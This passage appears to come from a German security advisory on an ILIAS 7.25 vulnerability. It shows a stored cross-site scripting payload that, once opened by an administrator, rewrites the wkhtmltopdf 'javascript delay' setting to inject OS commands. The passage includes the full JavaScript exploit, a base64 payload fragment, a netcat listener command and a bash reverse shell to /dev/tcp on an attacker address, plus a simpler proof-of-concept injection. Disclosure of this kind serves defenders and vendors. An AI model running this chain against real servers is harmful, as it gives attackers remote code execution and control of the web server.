wNyZiYXNlQ2xhc3M9aWxEYXNoYm9hcmRHVUkmZmFsbGJhY2tDbWQ9ZXhwb3J0UERGJnJ0b2tlbj0iK3QsIkdFVCIsIiIpLnRoZW4oKCk9Pntjb25zb2xlLmxvZygiWytdIFBERiBleHBvcnQgdHJpZ2dlcmVkLiBQYXlsb2FkIGV4ZWN1dGVkLiIpLHdpbmRvdy5sb2NhdGlvbi5ocmVmPWJ9KX0pfSk7'))</code><div class="absolute top-0 right-0 w-32 h-full z-10 px-2 text-xs text-gray-300 opacity-50 font-mono rounded-br-md bg-gradient-to-r from-transparent to-slate-600 pointer-events-none"></div></pre></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Kopieren und fügen Sie die geänderte Payload aus Ihrem Editor in das Textelement auf der Webseite ein und speichern Sie abschließend die Änderung über den Button <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Speichern und zurückkehren</span>.</p></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 5:</strong></span></p><p>Führen Sie auf Ihrem PC den folgenden <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">netcat</span> Befehl aus, um über den Port <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">1234</span> auf den Verbindungsaufbau mit dem Webserver warten.</p><p><span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">nc -nlvp 1234</span></p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/9/7/0/6/9706167723f77a8b9d6ffcfe06dc3b9d07ceb321/329afaefdb2f468d8d07414053530a4c-941x310.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/9/e/d/f/9edf49f35404f34f75757c4e497bdddc06d1ed3f/329afaefdb2f468d8d07414053530a4c-320x105.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/0/6/2/d/062d0d2f8949bd3c9fadaeb49169ba8b859b9415/329afaefdb2f468d8d07414053530a4c-400x132.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/d/7/d/5/d7d562da488e20e43ada0449c0fd9c11c2cc7522/329afaefdb2f468d8d07414053530a4c-600x198.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/2/4/4/b/244b30c39a73e1f2639b0efe18cda85ae59340fc/329afaefdb2f468d8d07414053530a4c-800x264.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/9/7/0/6/9706167723f77a8b9d6ffcfe06dc3b9d07ceb321/329afaefdb2f468d8d07414053530a4c-941x310.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/9/7/0/6/9706167723f77a8b9d6ffcfe06dc3b9d07ceb321/329afaefdb2f468d8d07414053530a4c-941x310.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/9/7/0/6/9706167723f77a8b9d6ffcfe06dc3b9d07ceb321/329afaefdb2f468d8d07414053530a4c-941x310.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="941" height="310" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 6:</strong></span></p><p>Loggen Sie sich <strong>als Administrator</strong> ein und öffnen Sie entweder die zuvor erstellte Portfolioseite des Users <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">testuser</span> über einen Direktlink oder über die Portfoliosuche unter <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Persönlicher Bereich &gt; Portfolio &gt; Portfolios anderer Benutzer</span>.</p><p>&nbsp;</p><p>Die hinterlegte Payload aus Schritt 3 wird beim Aufruf der Portfolioseite direkt ausgeführt. Überprüfen Sie Ihr CLI:</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/3/9/b/6/39b6374335871ef03577cdee00d144f4fb65425a/7bf8dc8e33d249ceb9a2c7c35ec296f7-984x386.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/f/4/e/a/f4ea4c3e21b1bfa4814174f1af898684ef2016b7/7bf8dc8e33d249ceb9a2c7c35ec296f7-320x126.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/4/8/2/6/4826fedbf7e8d75b443baba6289f7a9a4272909b/7bf8dc8e33d249ceb9a2c7c35ec296f7-400x157.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/a/8/c/8/a8c89968ebd470aea3fbb7b9a70eb06f573af39b/7bf8dc8e33d249ceb9a2c7c35ec296f7-600x235.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/2/4/9/6/24968feddb4a0687e09d1af2a4cbe52f35820afc/7bf8dc8e33d249ceb9a2c7c35ec296f7-800x314.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/3/9/b/6/39b6374335871ef03577cdee00d144f4fb65425a/7bf8dc8e33d249ceb9a2c7c35ec296f7-984x386.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/d/3/3/9/d3395d88d11469443c4de08a151413646c07f0ef/7bf8dc8e33d249ceb9a2c7c35ec296f7-983x386.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/d/3/3/9/d3395d88d11469443c4de08a151413646c07f0ef/7bf8dc8e33d249ceb9a2c7c35ec296f7-983x386.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="984" height="386" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Der Webserver hat eine Verbindung durch eine Reverse Shell mit dem PC aufgebaut. Als potenzieller Angreifer haben Sie mit den Rechten des User <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">www-data</span> Kontrolle über den Webserver, auf dem ILIAS installiert ist.</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/5/1/0/c/510c1fd57a196995667b7c8295456084d6cfc012/fa0c4242987e41ada5ffbd2092d9955e-1493x979.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/6/5/f/d/65fd9ed4e753c7c8c1ad07fea891fc0e88d7e9e0/fa0c4242987e41ada5ffbd2092d9955e-320x210.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/3/3/b/8/33b8af8adf0281911e93cf47fc3edc21a6bebf9a/fa0c4242987e41ada5ffbd2092d9955e-400x262.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/8/f/6/b/8f6b0e07ae301efa3f3c3e0dff12dd021ac6d465/fa0c4242987e41ada5ffbd2092d9955e-600x393.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/e/6/e/f/e6efe74f76a69e0deb23093712f12eadc9eeb8d4/fa0c4242987e41ada5ffbd2092d9955e-800x525.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/b/c/9/0/bc9057ad1036ce8c00143001437951c0a9c420a2/fa0c4242987e41ada5ffbd2092d9955e-1000x656.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/3/d/0/2/3d0248283d8bcbd69a701b3165c6e4eaf4225a82/fa0c4242987e41ada5ffbd2092d9955e-1200x787.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/5/1/0/c/510c1fd57a196995667b7c8295456084d6cfc012/fa0c4242987e41ada5ffbd2092d9955e-1493x979.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="1493" height="979" /></div><div class="infosec-headline  distanceBottom15"><h4 class="text-sky-400 text-lg font-semibold">Wie funktioniert die XSS Payload?</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Via Cross Site Scripting wird Schadcode base64 enkodiert hinterlegt, welcher von einem hoch priviligerten Nutzer durch einen entsprechenden Seitenaufruf ausgeführt werden muss.</p></div><div class="infosec-sourcecode relative  distanceBottom15"><div class="absolute -top-[25px] right-0 z-10 px-2 text-xs rounded-tr-md bg-gradient-to-r from-transparent to-slate-200 dark:to-slate-700"><div class="flex items-center"><svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12a7 7 0 0 1 7-7h2a7 7 0 1 1 0 14h-2a7 7 0 0 1-7-7Z" class="fill-gray-700"></path><path d="M10.25 9.75 7.75 12l2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path><path d="m13.75 9.75 2.5 2.25-2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path></svg><span class="ml-1 font-mono text-gray-700 dark:text-gray-400">Payload (Logik)</span></div></div><pre class="line-numbers relative block w-full" data-line="2-3,16,18,21" style><code class="language-javascript">// Some stuff needed
var pi = document.getElementById("sUhDeWhSwd"),
    ai = pi.dataset.ip,
    ap = pi.dataset.port,
    s = (e, t, o) =&gt; new Promise(a =&gt; {
        var s = new XMLHttpRequest;
        s.open(t, e, !0), s.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), s.responseType = "text", s.onreadystatechange = (() =&gt; {
            4 != s.readyState || 200 != s.status &amp;&amp; 302 != s.status || a(s)
        }), s.send(o), setTimeout(() =&gt; {
            s.abort(), a()
        }, 1e3)
    }),
    b = window.location.protocol + "//" + window.location.host,
    t = (document.getElementById("mm_search_form").getAttribute("action").match(/rtoken=([^&amp;]+)/) || [])[1];
// The important logic
s(b + "/ilias.php?ref_id=67&amp;admin_mode=settings&amp;cmd=post&amp;cmdClass=ilobjpdfgenerationgui&amp;cmdNode=1d:oz&amp;baseClass=ilAdministrationGUI&amp;fallbackCmd=view&amp;rtoken=" + t, "POST", "path=%2Fusr%2Fbin%2Fwkhtmltopdf&amp;external_links=1&amp;javascript_delay=200+%22127.0.0.1%22+%2Ftmp%2Fx.pdf+%26%26+rm+%2Ftmp%2Fx.pdf+%26%26+%2Fbin%2Fbash+-c+%27bash+-i+%3E%2Fdev%2Ftcp%2F" + ai + "%2F" + ap + "+0%3E%261%27+%23&amp;service=Portfolio&amp;purpose=ContentExport&amp;renderer=WkhtmlToPdf&amp;cmd%5BsaveConfig%5D=Speichern").then(() =&gt; {
    console.log("[+] Payload added to vulnerable module."),
    s(b + "/ilias.php?new_type=prtf&amp;cmd=post&amp;cmdClass=ilobjportfoliogui&amp;cmdNode=99:vf:p7&amp;baseClass=ilDashboardGUI&amp;rtoken=29c91ff8802da7a5d514631d9909e675", "POST", "title=x&amp;mode=mode_scratch&amp;ptype=page&amp;fpage=x&amp;cmd%5Bsave%5D=Erstellen").then(e =&gt; {
        console.log("[+] Portfolio created.");
        var o = (e.responseURL.match(/[?&amp;]prt_id=([^&amp;]+)/) || [])[1];
        s(b + "/ilias.php?prt_id=" + o + "&amp;cmd=post&amp;cmdClass=ilobjportfoliogui&amp;cmdNode=99:vf:p7&amp;baseClass=ilDashboardGUI&amp;fallbackCmd=exportPDF&amp;rtoken=" + t, "GET", "").then(() =&gt; {
            console.log("[+] PDF export triggered. Payload executed."), window.location.href = b
        })
    })
});</code><div class="absolute top-0 right-0 w-32 h-full z-10 px-2 text-xs text-gray-300 opacity-50 font-mono rounded-br-md bg-gradient-to-r from-transparent to-slate-600 pointer-events-none"></div></pre></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom15"><p><span class="text-amber-600 dark:text-amber-400"><strong>Eine Aufschlüsselung des Codes</strong></span></p></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><ol><li>Es werden Variablen deklariert und initialisiert.<span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">pi</span> ist ein DOM-Element, das über seine ID <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">sUhDeWhSwd</span> mithilfe von <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">document.getElementById()</span> abgerufen wird. <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">ai</span> ist der Wert des <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">data-ip</span> Attributes des Elements pi. <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">ap</span> ist der Wert des <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">data-port</span> Attributes des Elements <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">pi</span>. <span class="text-sky-600 dark:text-sky-400">[1]</span></li><li>Eine Funktion <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">s</span> wird definiert, die eine AJAX-Anfrage sendet. Diese Funktion erhält drei Parameter: die URL der Anfrage, die HTTP-Methode (GET oder POST) und den Datenstring, der mit der Anfrage gesendet werden soll.</li><li>Die Basis-URL (<span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">b</span>) wird aus dem aktuellen Protokoll und Hostnamen des Fensters zusammengesetzt.</li><li>Der Wert des <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">rtoken</span> Parameters wird aus dem action Attribut des Elements mit der ID <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">mm_search_form</span> extrahiert. Dieser Wert wird für spätere Anfragen verwendet.</li><li>Ein AJAX-Request wird an ILIAS gesendet. Die URL und die Daten, die an ILIAS gesendet werden, enthalten die Payload, welche auf eine Schwachstelle abzielt <em>(siehe folgender Abschnitt)</em>. <span class="text-sky-600 dark:text-sky-400">[2]</span></li><li>Ein weiterer AJAX-Request wird gesendet, um ein Portfolio zu erstellen. Wenn dies erfolgreich ist, wird die ID des erstellten Portfolios wird aus der Antwort extrahiert. <span class="text-sky-600 dark:text-sky-400">[3]</span></li><li>Ein dritter AJAX-Request wird gesendet, um einen PDF zu triggern. Wenn dies erfolgreich ist, wurde der PDF-Export ausgelöst und die <span class="text-sky-600 dark:text-sky-400">OS Injection Payload</span> ausgeführt. <span class="text-sky-600 dark:text-sky-400">[4]</span></li></ol></div><div class="infosec-headline  distanceBottom15"><h4 class="text-sky-400 text-lg font-semibold">Wie funktioniert die OS Injection Payload?</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom15"><p>Folgender Befehl wird bei einer Ausführung der <a target="_blank" rel="noopener external" href="https://owasp.org/www-community/attacks/Command_Injection" title="https://owasp.org/www-community/attacks/Command_Injection"><span class="text-red-600 dark:text-red-400">OS Command Injection</span></a> über die Funktion <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">exec()</span> in der Methode <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">execQuoted()</span> der Klasse ilUtil (<span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">/Services/Utilities/classes/class.ilUtil.php</span>) gänzlich ausgeführt:</p></div><div class="infosec-sourcecode relative  distanceBottom15"><div class="absolute -top-[25px] right-0 z-10 px-2 text-xs rounded-tr-md bg-gradient-to-r from-transparent to-slate-200 dark:to-slate-700"><div class="flex items-center"><svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12a7 7 0 0 1 7-7h2a7 7 0 1 1 0 14h-2a7 7 0 0 1-7-7Z" class="fill-gray-700"></path><path d="M10.25 9.75 7.75 12l2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path><path d="m13.75 9.75 2.5 2.25-2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path></svg><span class="ml-1 font-mono text-gray-700 dark:text-gray-400">CLI</span></div></div><pre class="line-numbers relative block w-full" data-line style="word-break: break-all; white-space: break-spaces;"><code class="language-html">/usr/bin/wkhtmltopdf --zoom 1 --enable-external-links --disable-forms --orientation Portrait --page-size A4 --javascript-delay 200 "127.0.0.1" /tmp/x.pdf &amp;&amp; rm /tmp/x.pdf &amp;&amp; /bin/bash -c 'bash -i &gt;/dev/tcp/X.X.X.X/1234 0&gt;&amp;1' # --margin-bottom 0.5cm --margin-left 0.5cm --margin-right 2cm --margin-top 2cm --quiet --cookie "PHPSESSID" "cv06phhvn81aa30gsnku0e6fl5" --cookie "ilClientId" "myilias" /var/www/ilias.local/files/myilias/temp/tmp650f626e2affe.html /var/www/ilias.local/files/myilias/temp/tmp650f626e2b056.pdf 2&gt;&amp;1</code><div class="absolute top-0 right-0 w-32 h-full z-10 px-2 text-xs text-gray-300 opacity-50 font-mono rounded-br-md bg-gradient-to-r from-transparent to-slate-600 pointer-events-none"></div></pre></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Um die Payload zu verstehen, hilft die Synopsis von wkhtmltopdf:<br><span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">wkhtmltopdf [GLOBAL OPTION]... [OBJECT]... &lt;output file&gt;</span></p><p>&nbsp;</p><p>Der CLI-Befehl beginnend mit <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">wkhtmltopdf</span> erscheint mit allen folgenden <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">[GLOBAL OPTION]</span> Parameter bis zu <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">--javascript-delay</span> wie erwartet normal. Die Payload aus Schritt 3 übergibt ab dieser Stelle den Wert <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">200</span> für die voranstehende Option und definiert anschließend direkt das <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">[OBJECT]</span> mit der localhost IP als Quelle <em>(könnte auch eine beliebige URL oder ein existenter Pfad zu einer Datei sein)</em>. Folgend wird mit <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">/tmp/x.pdf</span> das <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">&lt;output file&gt;</span> bestimmt, welches durch <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">&amp;&amp; rm /tmp/x.pdf</span> direkt wieder gelöscht wird <em>(das Löschen der Datei ist nicht zwingend notwendig)</em>. Es folgt die Reverse Shell in der Befehlskette, welche mit der IP des Angreifers über den Port <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">1234</span> eine Verbindung aufbaut: <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">&amp;&amp; /bin/bash -c 'bash -i &gt;/dev/tcp/X.X.X.X/1234 0&gt;&amp;1'</span> . Abschließend werden alle nachfolgenden Zeichen des CLI-Befehls mit <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">#</span> auskommentiert.</p></div><div class="infosec-headline  distanceBottom30"><h4 class="text-sky-400 text-lg font-semibold">Reproduktionsschritte (als Admin)</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 1:</strong></span></p><p>Installieren Sie eine <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">ILIAS-Version7.25 2023-09-12</span> Instanz auf einem Testsystem. Loggen Sie sich als Administrator ein.<br>&nbsp;</p><p>Navigieren Sie anschließend auf die Seite <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Administration -&gt; PDF-Erstellung<sup>(1)</sup></span> und klicken Sie unter dem Tab <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Einstellungen</span> auf den Button <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Konfiguriere Renderer<sup>(2)</sup></span> in der Sektion <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Portfolio / ContentExport</span>.</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/5/5/a/c/55ac76f9071d4375f6c044c15b45011bc3aee362/c1f0c16e30ea46e582886cf6c0c3263f-2129x972.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/b/c/b/5/bcb504e1fe2ad691fffffb15a2eb95531ad2e951/c1f0c16e30ea46e582886cf6c0c3263f-320x146.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/9/9/a/4/99a4e70422cafcb30b9170cdc11e24f481151236/c1f0c16e30ea46e582886cf6c0c3263f-400x183.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/2/7/2/c/272c6b2bb76ead3787aa70c1fcc405548a24a3aa/c1f0c16e30ea46e582886cf6c0c3263f-600x274.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/8/c/1/6/8c1626d95f3d1ea94527dd2a1c029ee98fc33f25/c1f0c16e30ea46e582886cf6c0c3263f-800x365.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/d/b/5/3/db532c96723feb3b8713889a99bd9240ca3f0a9e/c1f0c16e30ea46e582886cf6c0c3263f-1000x457.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/7/0/a/2/70a265a619f9b64f4adb42c98cd7024208b60222/c1f0c16e30ea46e582886cf6c0c3263f-1200x548.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/6/8/8/e/688e379f54c9739689d53c44764ec43d625a6c04/c1f0c16e30ea46e582886cf6c0c3263f-1600x730.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="2129" height="972" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 2:</strong></span></p><p>Kopieren Sie folgende Payload:</p></div><div class="infosec-sourcecode relative  distanceBottom30"><div class="absolute -top-[25px] right-0 z-10 px-2 text-xs rounded-tr-md bg-gradient-to-r from-transparent to-slate-200 dark:to-slate-700"><div class="flex items-center"><svg class="h-6 w-6" viewBox="0 0 24 24" fill="none"><path d="M4 12a7 7 0 0 1 7-7h2a7 7 0 1 1 0 14h-2a7 7 0 0 1-7-7Z" class="fill-gray-700"></path><path d="M10.25 9.75 7.75 12l2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path><path d="m13.75 9.75 2.5 2.25-2.5 2.25" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-sky-100"></path></svg><span class="ml-1 font-mono text-gray-700 dark:text-gray-400">payload</span></div></div><pre class="line-numbers relative block w-full" data-line style="word-break: break-all; white-space: break-spaces;"><code class="language-php">200 "127.0.0.1" /tmp/x.pdf &amp;&amp; rm /tmp/x.pdf &amp;&amp; echo "Payload executed successfully" &gt; /tmp/poc.txt #</code><div class="absolute top-0 right-0 w-32 h-full z-10 px-2 text-xs text-gray-300 opacity-50 font-mono rounded-br-md bg-gradient-to-r from-transparent to-slate-600 pointer-events-none"></div></pre></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Um die erfolgreiche Ausführung einer Injektion simpel überprüfen zu können, wird mit dieser Payload eine Datei <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">poc.txt</span> im Verzeichnis <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">/tmp</span> auf dem Webserver abgelegt. Siehe Was genau macht die Payload? Eine detaillierte Aufschlüsslung technischer Details finden Sie unter <a href="#">1. Reproduktionsschritte (Worst-Case)</a></p></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Fügen Sie die kopierte Payload in das Eingabefeld Javascript Verzögerung ein.</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/1/2/d/4/12d47fc3a31850182acb9c7d81e604d4fa21e690/89c858813bb741d5ba1dacf160e37e9e-1263x202.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/2/e/0/4/2e0488afbe102c76a33f071a67eb716bb7b774a5/89c858813bb741d5ba1dacf160e37e9e-320x51.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/e/c/5/8/ec58fb362839ea436ca4b79448f1846245b307f6/89c858813bb741d5ba1dacf160e37e9e-400x64.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/2/a/f/2/2af22eb71eb9fdea6d93c44f97a219d2426a1508/89c858813bb741d5ba1dacf160e37e9e-600x96.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/9/b/a/9/9ba93354aab988ddf5df224a41090a2f57ce8676/89c858813bb741d5ba1dacf160e37e9e-800x128.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/6/9/0/a/690a16f92408be30a630e2742b1cbcf27f469928/89c858813bb741d5ba1dacf160e37e9e-1000x160.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/c/1/a/3/c1a38d8407668638a5d0b35bf3c3d60687013c19/89c858813bb741d5ba1dacf160e37e9e-1200x192.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/1/2/d/4/12d47fc3a31850182acb9c7d81e604d4fa21e690/89c858813bb741d5ba1dacf160e37e9e-1263x202.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="1263" height="202" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 3:</strong></span></p><p>Führen Sie einen PDF-Export über ein beliebiges Modul aus. Zum Beispiel über <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">Portfolio</span>. Erstellen Sie hierzu ein Portfolio und führen Sie einen PDF-Export aus:</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/8/0/5/8/80588e234077d2a1d005341724b75e370f8594d6/9ce259e40cf84343afc0814cfbb41dd7-987x400.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/c/a/f/6/caf603ce171a0a73c6fcd54b3aa2e5c33825ed9b/9ce259e40cf84343afc0814cfbb41dd7-320x130.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/a/a/5/e/aa5e7ea06cbf3a66d46a82b3d07a4a4429f47ac7/9ce259e40cf84343afc0814cfbb41dd7-400x162.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/5/2/2/6/52261853a98ae9c651836e30444fd094a071649d/9ce259e40cf84343afc0814cfbb41dd7-600x243.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/a/e/a/c/aeac7a207916450dd4bd788c78873246a0816601/9ce259e40cf84343afc0814cfbb41dd7-800x324.webp 800w, https://rehmeinfosec.de/_Resources/Persistent/8/0/5/8/80588e234077d2a1d005341724b75e370f8594d6/9ce259e40cf84343afc0814cfbb41dd7-987x400.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/8/0/5/8/80588e234077d2a1d005341724b75e370f8594d6/9ce259e40cf84343afc0814cfbb41dd7-987x400.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/8/0/5/8/80588e234077d2a1d005341724b75e370f8594d6/9ce259e40cf84343afc0814cfbb41dd7-987x400.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="987" height="400" /></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><span class="text-amber-600 dark:text-amber-400"><strong>Schritt 4:</strong></span></p><p>Prüfen Sie auf dem Webserver, ob die Payload erfolgreich ausgeführt wurde:</p></div><div class="infosec-image  distanceBottom30"><img src="https://rehmeinfosec.de/_Resources/Persistent/3/9/2/e/392e0f644aa5a854b2ee67c1bcaa657eec14573e/709895ecf7034379a7a81074719b5e08-1095x248.webp" srcset="https://rehmeinfosec.de/_Resources/Persistent/9/f/b/2/9fb23eedec5a4be7440d211e406892fde6b60022/709895ecf7034379a7a81074719b5e08-320x72.webp 320w, https://rehmeinfosec.de/_Resources/Persistent/6/1/5/b/615b61afc24f4efd54547954532844c1fc58807a/709895ecf7034379a7a81074719b5e08-400x91.webp 400w, https://rehmeinfosec.de/_Resources/Persistent/4/d/f/a/4dfa7cfe97638a44ce9431814582248c21295cd5/709895ecf7034379a7a81074719b5e08-600x136.webp 600w, https://rehmeinfosec.de/_Resources/Persistent/4/3/1/a/431aa64fbb617a09cb9b44f73b6de26e10f43a1e/709895ecf7034379a7a81074719b5e08-800x181.webp 